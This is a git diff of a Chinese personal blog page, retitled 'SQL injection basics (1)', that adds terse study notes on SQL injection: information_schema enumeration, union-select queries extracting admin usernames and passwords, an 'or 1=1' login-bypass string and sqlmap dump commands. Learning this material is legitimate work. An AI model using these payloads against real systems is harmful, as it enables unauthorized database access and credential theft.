@@ -3,12 +3,12 @@
   <head>
     <meta charset="utf-8" >
 
-<title>SQL语言基础（一） | godsfall</title>
+<title>SQL注入基础（一） | godsfall</title>
 
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 
 <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
-<link rel="shortcut icon" href="https://gods-fall.github.io/favicon.ico?v=1644636632112">
+<link rel="shortcut icon" href="https://gods-fall.github.io/favicon.ico?v=1645270398170">
 <link rel="stylesheet" href="https://gods-fall.github.io/styles/main.css">
 
 
@@ -37,7 +37,7 @@ sh..." />
   <div class="top-container" data-aos="fade-right">
     <div class="top-header-container">
       <a class="site-title-container" href="https://gods-fall.github.io">
-        <img src="https://gods-fall.github.io/images/avatar.png?v=1644636632112" class="site-logo">
+        <img src="https://gods-fall.github.io/images/avatar.png?v=1645270398170" class="site-logo">
         <h1 class="site-title">godsfall</h1>
       </a>
       <div class="menu-btn" @click="menuVisible = !menuVisible">
@@ -104,8 +104,11 @@ sh..." />
       <div class="main-container">
         <div class="content-container" data-aos="fade-up">
           <div class="post-detail">
-            <h2 class="post-title">SQL语言基础（一）</h2>
+            <h2 class="post-title">SQL注入基础（一）</h2>
             <div class="post-date">2022-02-05</div>
+            
+              <div class="feature-container" style="background-image: url('https://tse2-mm.cn.bing.net/th/id/OIP-C.9Pr9UjrwH7Md1kgPiWfkHwHaHa?pid=ImgDet&amp;rs=1')">
+              </div>
             
             <div class="post-content" v-pre>
               <p>小皮面板一个<br>
@@ -123,8 +126,25 @@ insert into + values (2,'delisa','1234');<br>
 select * from + where id=1 and usernmae=“admin”;表查询（and，or）<br>
 select * from hack where id=2 and exists (select * from hack1);表成立<br>
 select username,password from hack order by 2;排序<br>
-select username,password from hack union select usernmae,id from hack1 union（*is two）</p>
+select username,password from hack union select usernmae,id（1，2，3） from hack1 union（*is two）</p>
 <h1 id="-">--    /* */</h1>
+<p>判断注入点<br>
+information_schema （元数据库，存放其他数据库的所有信息）<br>
+schemata用于放数据库名，tables用于存放所有数据库中的数据表名，columns所有字段名<br>
+select table_name(字段) from information_schema.tables(表名) where table_schema=&quot;hack&quot;<br>
+group_concat()显示字段中的所有内容<br>
+union select 1, unhex(hex(username)),unhex(hex(password)),4,5 from admin<br>
+解决编码不一致，编码转化unhex（hex()）<br>
+穿山甲（tnnd qaq）<br>
+密码绕过-（sql万能密码）<br>
+<img src="https://gods-fall.github.io/post-images/1645079435118.png" alt="" loading="lazy"><br>
+select*from admin where username='1'or 1=1or'1'and password='$mpassword'(逻辑运算and&gt;o;'or'='or')<br>
+定义黑名单过滤，i think don't safe.<br>
+sqlmap使用(vulnerable)<br>
+sqlmap.py -u (注入点判断) --tables --columns -T/ --dump -C &quot;,&quot;<br>
+sqlmap.py -u    --dbs (all)/current-db\user(now)/is-dba(判断是否是管理员)<br>
+sqlmap.py  -u     --tables -D&quot;&quot;(php)<br>
+sqlmap.py -u   --cookie &quot;&quot; -level 2</p>
 </blockquote>
 
             </div>
